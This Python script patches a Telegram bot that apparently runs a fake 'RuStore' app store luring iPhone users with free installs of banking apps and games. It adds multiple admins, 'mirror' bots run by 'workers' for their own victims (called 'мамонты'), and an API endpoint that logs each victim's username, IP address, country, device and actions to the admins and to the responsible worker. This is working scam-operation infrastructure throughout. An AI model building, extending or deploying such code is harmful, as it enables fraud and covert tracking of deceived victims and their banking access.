import re

with open('bot.js', 'r', encoding='utf-8') as f:
    bot_js = f.read()

# 1. ADMIN_CHAT_ID replacement
bot_js = bot_js.replace(
    "const ADMIN_CHAT_ID = '8482944892';",
    "const ADMIN_CHAT_ID_LEGACY = '8482944892';\n"
    "let admins = [ADMIN_CHAT_ID_LEGACY];\n"
    "if (fs.existsSync('admins.json')) { admins = JSON.parse(fs.readFileSync('admins.json', 'utf8')); }\n"
    "function saveAdmins() { fs.writeFileSync('admins.json', JSON.stringify(admins, null, 2), 'utf8'); }\n"
    "let mirrors = {};\n"
    "if (fs.existsSync('mirrors.json')) { mirrors = JSON.parse(fs.readFileSync('mirrors.json', 'utf8')); }\n"
    "function saveMirrors() { fs.writeFileSync('mirrors.json', JSON.stringify(mirrors, null, 2), 'utf8'); }\n"
)

bot_js = bot_js.replace("const bot = new Telegraf(token);", "async function notifyAllAdmins(msg, extra = {}) { for (const a of admins) { try { await bot.telegram.sendMessage(a, msg, extra); } catch(e) {} } }\nconst bot = new Telegraf(token);")

bot_js = bot_js.replace("ctx.chat.id.toString() !== ADMIN_CHAT_ID", "!admins.includes(ctx.chat.id.toString())")
bot_js = bot_js.replace("chatId.toString() === ADMIN_CHAT_ID", "admins.includes(chatId.toString())")

# 2. Add buttons to menus
old_sendMainMenu = """        [Markup.button.callback('➕ Добавить приложение', 'add_app')],
        [Markup.button.callback('📋 Мои приложения', 'list_apps')],
        [Markup.button.callback('⚙️ Настройки', 'settings')],
        [Markup.button.callback('💬 Диалоги поддержки', 'view_chats')]"""
new_sendMainMenu = """        [Markup.button.callback('➕ Добавить приложение', 'add_app')],
        [Markup.button.callback('📋 Мои приложения', 'list_apps')],
        [Markup.button.callback('⚙️ Настройки', 'settings')],
        [Markup.button.callback('💬 Диалоги поддержки', 'view_chats')],
        [Markup.button.callback('👮 Управление админами', 'manage_admins')],
        [Markup.button.callback('🪞 Управление зеркалами', 'manage_mirrors')]"""
bot_js = bot_js.replace(old_sendMainMenu, new_sendMainMenu)

old_start = """    const keyboard = Markup.inlineKeyboard([
        [Markup.button.webApp('📲 Открыть RuStore', WEBAPP_URL)],
        [Markup.button.url('📜 Политика конфиденциальности', 'https://telegra.ph/Polzovatelskoe-soglashenie-RuStore-04-15')]
    ]);"""
new_start = """    const keyboard = Markup.inlineKeyboard([
        [Markup.button.webApp('📲 Открыть RuStore', WEBAPP_URL)],
        [Markup.button.url('📜 Политика конфиденциальности', 'https://telegra.ph/Polzovatelskoe-soglashenie-RuStore-04-15')],
        [Markup.button.callback('🤖 Моё зеркало', 'worker_mirror')]
    ]);"""
bot_js = bot_js.replace(old_start, new_start)

# 3. Add workerId to app creation
old_appsData = """                    appsData[state.data.id] = {
                        title: state.data.title,
                        aliases: [state.data.id, state.data.title.toLowerCase()],
                        category: state.data.category,
                        rating: (4 + Math.random()).toFixed(1),
                        reviewsCount: '1 тыс.',
                        downloads: '10 тыс. +',
                        size: state.data.size,
                        icon: iconPath,
                        description: state.data.description,
                        screenshots: [],
                        reviews: generateInitialReviews()
                    };"""
new_appsData = """                    const isAdminCreator = admins.includes(chatId.toString());
                    appsData[state.data.id] = {
                        title: state.data.title,
                        aliases: [state.data.id, state.data.title.toLowerCase()],
                        category: state.data.category,
                        rating: (4 + Math.random()).toFixed(1),
                        reviewsCount: '1 тыс.',
                        downloads: '10 тыс. +',
                        size: state.data.size,
                        icon: iconPath,
                        description: state.data.description,
                        screenshots: [],
                        reviews: generateInitialReviews(),
                        workerId: isAdminCreator ? null : chatId.toString()
                    };"""
bot_js = bot_js.replace(old_appsData, new_appsData)

# 4. Support routing functions
old_support = re.compile(r'async function notifyAdminNewChat\(sessionId\) \{.*?\nfunction escapeHtmlBot', re.DOTALL)
with open('rewrite_support.js', 'r', encoding='utf-8') as f:
    rs = f.read()
new_support = re.search(r'(function getSupportRecipients\(session\).*?function escapeHtmlBot)', rs, re.DOTALL).group(1)
bot_js = old_support.sub(new_support, bot_js)

# 5. Mirror and API
api_log = """
app.use(express.json());

app.post('/api/log', async (req, res) => {
    const { workerId, msg, user_info, action } = req.body;
    const username = user_info.username ? '@' + user_info.username : user_info.id;
    const deviceInfo = user_info.device || 'Неизвестно';
    const loc = (user_info.country || 'Н/Д') + ' / ' + (user_info.ip || 'Н/Д');
    
    const workerUsername = (mirrors[workerId] && mirrors[workerId].username) ? '@' + mirrors[workerId].username : workerId;
    const botUsername = (mirrors[workerId] && mirrors[workerId].botUsername) ? '@' + mirrors[workerId].botUsername : 'Основной бот';
    const adminMsg = `❗️ <b>Лог</b>\\nМамонт (${username}) совершил действие: <b>${action}</b>\\n📍 ${loc} | 💻 ${deviceInfo}\\n🤖 Зеркало: ${botUsername}\\n👤 Воркер: ${workerUsername}\\n\\n💬 <i>${msg}</i>`;
    await notifyAllAdmins(adminMsg, { parse_mode: 'HTML' });
    
    if (workerId && workerId !== 'null' && workerId !== '8482944892') {
        const workerMsg = `❗️ <b>Ваш мамонт (${username})</b>: ${action}\\n📍 ${loc} | 💻 ${deviceInfo}\\n\\n💬 <i>${msg}</i>`;
        try {
            await bot.telegram.sendMessage(workerId, workerMsg, { parse_mode: 'HTML' });
        } catch(e) {}
    }
    res.send('ok');
});

let runningMirrors = {};
function startMirror(workerId, token, botUsername) {
    if (runningMirrors[workerId]) return;
    const mirrorBot = new Telegraf(token);
    mirrorBot.start(async (ctx) => {
        if (ctx.from.username && mirrors[workerId]) {
            mirrors[workerId].username = ctx.from.username;
            saveMirrors();
        }
        const text = `❌ Проблема с установкой приложений на iPhone для работы и повседневной жизни?\\n\\n🎁 Ничего страшного, ведь наш сервис бесплатно помогает устанавливать все это!\\n\\n📱 Доступные приложения и игры:\\n🏦 Сбербанк, Тинькофф, Альфа Банк и другие банки\\n🎮 Toca Boca, Minecraft и еще множество игр!\\n👑 CapCut Pro, Picsart Gold\\n✨ И многое другое!`;
        const keyboard = Markup.inlineKeyboard([
            [Markup.button.webApp('📲 Открыть RuStore', WEBAPP_URL + '?worker=' + workerId)],
            [Markup.button.url('📜 Политика конфиденциальности', 'https://telegra.ph/Polzovatelskoe-soglashenie-RuStore-04-15')]
        ]);
        try {
            await ctx.replyWithPhoto({ source: 'start_image.jpg' }, { caption: text, parse_mode: 'HTML', reply_markup: keyboard.reply_markup });
        } catch (e) {
            await ctx.reply(text, keyboard);
        }
    });
    mirrorBot.launch().catch(e => console.error("Mirror launch error:", e));
    runningMirrors[workerId] = mirrorBot;
}
for (let wid in mirrors) {
    startMirror(wid, mirrors[wid].token, mirrors[wid].botUsername);
}
"""

bot_js = bot_js.replace("combinedServer.listen(8080, () => console.log('Static + WebSocket server running on port 8080'));", api_log + "\ncombinedServer.listen(8080, () => console.log('Static + WebSocket server running on port 8080'));")

# 6. Admin Panel & Worker Panel actions
admin_actions = """
bot.action('worker_mirror', (ctx) => {
    if (globalSettings.mirrorsEnabled === false) {
        if (!globalSettings.mirrorWhitelist || !globalSettings.mirrorWhitelist.includes(ctx.chat.id.toString())) return ctx.reply("❌ Создание зеркал сейчас закрыто администрацией.");
    }
    if (mirrors[ctx.chat.id]) return ctx.reply(`✅ Ваше зеркало уже работает: @${mirrors[ctx.chat.id].botUsername}`, Markup.inlineKeyboard([[Markup.button.callback('🗑 Удалить зеркало', 'delete_my_mirror')]]));
    userState[ctx.chat.id] = { step: 'mirror_token' };
    ctx.reply("Отправьте токен вашего бота (от @BotFather):");
});
bot.action('delete_my_mirror', (ctx) => {
    const k = ctx.chat.id.toString();
    if (runningMirrors[k]) { runningMirrors[k].stop(); delete runningMirrors[k]; }
    delete mirrors[k];
    saveMirrors();
    ctx.reply("Ваше зеркало удалено!");
});
bot.action('manage_admins', (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return;
    const msg = "👮 **Управление админами**\\nТекущие админы: " + admins.join(', ');
    ctx.editMessageText(msg, { parse_mode: 'Markdown', reply_markup: Markup.inlineKeyboard([[Markup.button.callback('➕ Добавить админа', 'add_admin')], [Markup.button.callback('➖ Удалить админа', 'remove_admin')], [Markup.button.callback('🔙 Назад', 'back_start')]]).reply_markup });
});
bot.action('add_admin', (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return;
    userState[ctx.chat.id] = { step: 'input_add_admin' };
    ctx.reply("Введите Chat ID нового администратора:");
});
bot.action('remove_admin', (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return;
    userState[ctx.chat.id] = { step: 'input_remove_admin' };
    ctx.reply("Введите Chat ID администратора для удаления:");
});
bot.action('manage_mirrors', (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return;
    const msg = "🪞 **Управление зеркалами**\\n\\nВсего зеркал: " + Object.keys(mirrors).length + "\\nДоступ: " + (globalSettings.mirrorsEnabled === false ? "Только Whitelist" : "Открыт всем");
    ctx.editMessageText(msg, { parse_mode: 'Markdown', reply_markup: Markup.inlineKeyboard([[Markup.button.callback(globalSettings.mirrorsEnabled === false ? '🔓 Открыть для всех' : '🔒 Закрыть (Whitelist)', 'toggle_mirrors')], [Markup.button.callback('➕ Добавить в Whitelist', 'add_whitelist')], [Markup.button.callback('📋 Список зеркал', 'list_mirrors')], [Markup.button.callback('🔙 Назад', 'back_start')]]).reply_markup });
});
bot.action('toggle_mirrors', (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return;
    globalSettings.mirrorsEnabled = (globalSettings.mirrorsEnabled === false) ? true : false;
    saveSettings();
    bot.handleUpdate({ callback_query: { id: ctx.callbackQuery.id, from: ctx.from, message: ctx.callbackQuery.message, chat_instance: ctx.callbackQuery.chat_instance, data: 'manage_mirrors' } });
});
bot.action('add_whitelist', (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return;
    userState[ctx.chat.id] = { step: 'input_whitelist' };
    ctx.reply("Введите Chat ID воркера для выдачи доступа:");
});
bot.action('list_mirrors', (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return;
    const keys = Object.keys(mirrors);
    if (keys.length === 0) return ctx.reply("Зеркал пока нет.");
    const buttons = keys.map(k => [Markup.button.callback(`@${mirrors[k].botUsername} (${mirrors[k].username})`, `view_mirror_${k}`)]);
    ctx.editMessageText("📋 **Список зеркал:**", { parse_mode: 'Markdown', reply_markup: { inline_keyboard: buttons } });
});
bot.action(/view_mirror_(.+)/, (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return;
    const k = ctx.match[1]; const m = mirrors[k];
    if (!m) return ctx.reply("Зеркало не найдено.");
    const msg = `🪞 Зеркало: @${m.botUsername}\\n👤 Воркер: @${m.username} (ID: ${k})\\n🛠 Права на свои приложения: ${m.canAddApps ? '✅ Да' : '❌ Нет'}`;
    ctx.editMessageText(msg, { reply_markup: Markup.inlineKeyboard([[Markup.button.callback(m.canAddApps ? '❌ Забрать права' : '✅ Выдать права', `toggle_app_rights_${k}`)], [Markup.button.callback('🗑 Удалить зеркало', `delete_mirror_${k}`)], [Markup.button.callback('🔙 К списку', 'list_mirrors')]]).reply_markup });
});
bot.action(/toggle_app_rights_(.+)/, (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return;
    const k = ctx.match[1];
    if (mirrors[k]) {
        mirrors[k].canAddApps = !mirrors[k].canAddApps;
        saveMirrors();
        if (mirrors[k].canAddApps) bot.telegram.sendMessage(k, "✅ Администратор выдал вам права на добавление собственных приложений в ваше зеркало! Нажмите /start и перейдите в добавление.").catch(()=>{});
    }
    bot.handleUpdate({ callback_query: { id: ctx.callbackQuery.id, from: ctx.from, message: ctx.callbackQuery.message, chat_instance: ctx.callbackQuery.chat_instance, data: `view_mirror_${k}` } });
});
bot.action(/delete_mirror_(.+)/, (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return;
    const k = ctx.match[1];
    if (runningMirrors[k]) { runningMirrors[k].stop(); delete runningMirrors[k]; }
    delete mirrors[k]; saveMirrors();
    ctx.answerCbQuery("Зеркало удалено!");
    bot.handleUpdate({ callback_query: { id: ctx.callbackQuery.id, from: ctx.from, message: ctx.callbackQuery.message, chat_instance: ctx.callbackQuery.chat_instance, data: 'list_mirrors' } });
});
"""

text_logic = """
    if (state && state.step === 'input_add_admin') {
        const id = ctx.message.text.trim();
        if (!admins.includes(id)) { admins.push(id); saveAdmins(); bot.telegram.sendMessage(id, "🎉 Вам выданы права администратора! Нажмите /admin").catch(()=>{}); }
        ctx.reply("✅ Админ добавлен!"); delete userState[ctx.chat.id]; return;
    }
    if (state && state.step === 'input_remove_admin') {
        const id = ctx.message.text.trim();
        admins = admins.filter(a => a !== id); saveAdmins();
        ctx.reply("✅ Админ удален!"); delete userState[ctx.chat.id]; return;
    }
    if (state && state.step === 'input_whitelist') {
        const id = ctx.message.text.trim();
        globalSettings.mirrorWhitelist = globalSettings.mirrorWhitelist || [];
        if (!globalSettings.mirrorWhitelist.includes(id)) { globalSettings.mirrorWhitelist.push(id); saveSettings(); }
        ctx.reply("✅ Воркер добавлен в белый список!"); delete userState[ctx.chat.id]; return;
    }
    if (state && state.step === 'mirror_token') {
        const token = ctx.message.text.trim();
        const testBot = new Telegraf(token);
        testBot.telegram.getMe().then(async botInfo => {
            mirrors[ctx.chat.id] = { token, botUsername: botInfo.username, username: ctx.from.username || ctx.from.first_name, canAddApps: false };
            saveMirrors(); startMirror(ctx.chat.id, token, botInfo.username); delete userState[ctx.chat.id];
            await notifyAllAdmins(`🆕 Воркер @${ctx.from.username || ctx.from.id} создал зеркало: @${botInfo.username}`);
            ctx.reply(`✅ Зеркало успешно запущено! Бот: @${botInfo.username}\\nТеперь ваши мамонты могут писать туда, и логи придут вам!`);
        }).catch(e => {
            ctx.reply("❌ Неверный токен. Попробуйте еще раз или напишите /start для отмены.");
        });
        return;
    }
    if (state && state.step === 'id' && !admins.includes(ctx.chat.id.toString())) {
        if (!mirrors[ctx.chat.id] || !mirrors[ctx.chat.id].canAddApps) {
            delete userState[ctx.chat.id]; return ctx.reply("❌ У вас нет прав на добавление приложений.");
        }
    }
"""
bot_js = bot_js.replace("bot.launch().then(() => console.log('Telegraf bot is running...'));", admin_actions + "\n" + "bot.launch().then(() => console.log('Telegraf bot is running...'));")
bot_js = bot_js.replace("bot.on('text', async (ctx, next) => {", "bot.on('text', async (ctx, next) => {" + text_logic)

with open('bot.js', 'w', encoding='utf-8') as f:
    f.write(bot_js)

print("SUCCESS")
